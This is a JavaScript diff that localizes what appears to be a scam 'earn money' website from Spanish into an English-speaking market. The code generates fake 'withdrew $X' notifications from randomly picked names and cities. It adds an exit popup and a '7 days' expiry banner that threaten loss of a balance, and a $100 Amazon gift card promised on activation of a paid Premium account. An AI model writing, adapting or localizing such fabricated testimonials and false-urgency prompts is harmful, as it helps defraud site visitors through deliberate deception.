@@ -28,8 +28,8 @@
     }
 
     // ─── 2. SOCIAL PROOF NOTIFICATIONS ───────────────────────────────────────
-    var NAMES = ['Ana G.', 'Carlos M.', 'Sofía R.', 'Miguel A.', 'Laura P.', 'Diego F.', 'Valentina L.', 'Sebastián T.', 'Camila N.', 'Andrés B.', 'Mariana V.', 'José C.', 'Isabella M.', 'Roberto H.', 'Fernanda S.'];
-    var CITIES = ['Buenos Aires', 'Ciudad de México', 'Bogotá', 'Lima', 'Santiago', 'Caracas', 'Montevideo', 'Quito', 'Medellín', 'Guadalajara'];
+    var NAMES = ['Anna G.', 'Charles M.', 'Sophia R.', 'Michael A.', 'Laura P.', 'Diego F.', 'Emma L.', 'Sebastian T.', 'Camilla N.', 'Andrew B.', 'Mary V.', 'Robert H.', 'Sarah S.'];
+    var CITIES = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'London'];
 
     function showSocialProof() {
         var name = NAMES[rand(0, NAMES.length - 1)];
@@ -39,8 +39,8 @@
         var el = document.createElement('div');
         el.className = 'social-proof-toast';
         el.innerHTML = '<div class="sp-avatar">' + name[0] + '</div>'
-            + '<div class="sp-text"><strong>' + name + '</strong> de ' + city + '<br>'
-            + '<span>retiró <strong>$' + amount + '</strong> hace ' + mins + ' min</span></div>'
+            + '<div class="sp-text"><strong>' + name + '</strong> from ' + city + '<br>'
+            + '<span>withdrew <strong>$' + amount + '</strong> ' + mins + ' min ago</span></div>'
             + '<div class="sp-icon">💸</div>';
         document.body.appendChild(el);
         setTimeout(function () { el.classList.add('sp-visible'); }, 100);
@@ -73,10 +73,10 @@
         overlay.id = 'exitPopupOverlay';
         overlay.innerHTML = '<div class="exit-popup">'
             + '<div class="exit-popup-icon">⚠️</div>'
-            + '<h3 class="exit-popup-title">¡Espera!</h3>'
-            + '<p class="exit-popup-msg">Tienes <strong>$' + bal.toFixed(2) + '</strong> acumulados que podrías perder si no desbloqueas tu cuenta hoy.</p>'
-            + '<button class="exit-popup-cta" id="exitCtaBtn">🔓 Desbloquear y Sacar Ahora</button>'
-            + '<br><button class="exit-popup-dismiss" id="exitDismissBtn">Salir sin retirar</button>'
+            + '<h3 class="exit-popup-title">Wait!</h3>'
+            + '<p class="exit-popup-msg">You have <strong>$' + bal.toFixed(2) + '</strong> accumulated that you could lose if you don\'t unlock your account today.</p>'
+            + '<button class="exit-popup-cta" id="exitCtaBtn">🔓 Unlock & Withdraw Now</button>'
+            + '<br><button class="exit-popup-dismiss" id="exitDismissBtn">Leave without withdrawing</button>'
             + '</div>';
         document.body.appendChild(overlay);
         setTimeout(function () { overlay.classList.add('show'); }, 30);
@@ -139,9 +139,9 @@
         var banner = document.createElement('div');
         banner.id = 'expiryBanner';
         banner.className = 'expiry-banner';
-        banner.innerHTML = '<span>⚠️ Tu saldo de <strong>$' + bal.toFixed(2)
-            + '</strong> expira en <strong>7 días</strong>. '
-            + '<span class="expiry-link" id="expiryLink">Retíralo ahora →</span></span>'
+        banner.innerHTML = '<span>⚠️ Your balance of <strong>$' + bal.toFixed(2)
+            + '</strong> expires in <strong>7 days</strong>. '
+            + '<span class="expiry-link" id="expiryLink">Withdraw now →</span></span>'
             + '<button class="expiry-x" id="expiryX">✕</button>';
         var after = document.getElementById('countdownBanner') || document.querySelector('.header');
         if (after) after.after(banner);
@@ -177,12 +177,12 @@
             overlay.innerHTML = '<div class="exit-popup gift-card-popup">'
                 + '<button class="unlock-popup-x" id="gcPopupX" style="position:absolute;top:12px;right:14px">✕</button>'
                 + '<div style="font-size:48px;margin-bottom:8px">🎁</div>'
-                + '<h3 class="exit-popup-title">Tarjeta Amazon $100</h3>'
-                + '<p class="exit-popup-msg">¡Tienes una <strong>tarjeta de regalo de Amazon de $100</strong> esperándote!<br><br>'
-                + 'Podrás retirarla junto con tu saldo acumulado al activar tu cuenta <strong>Premium</strong>. '
-                + 'El código será enviado directamente a tu correo de PayPal.</p>'
-                + '<button class="unlock-cta-btn" id="gcCtaBtn">🔓 Desbloquear y Recibir mi Tarjeta</button>'
-                + '<br><button class="exit-popup-dismiss" id="gcDismissBtn">Más tarde</button>'
+                + '<h3 class="exit-popup-title">$100 Amazon Gift Card</h3>'
+                + '<p class="exit-popup-msg">You have a <strong>$100 Amazon gift card</strong> waiting for you!<br><br>'
+                + 'You can redeem it together with your accumulated balance when you activate your <strong>Premium</strong> account. '
+                + 'The code will be sent directly to your PayPal email.</p>'
+                + '<button class="unlock-cta-btn" id="gcCtaBtn">🔓 Unlock & Receive My Card</button>'
+                + '<br><button class="exit-popup-dismiss" id="gcDismissBtn">Later</button>'
                 + '</div>';
             document.body.appendChild(overlay);
             setTimeout(function () { overlay.classList.add('show'); }, 30);
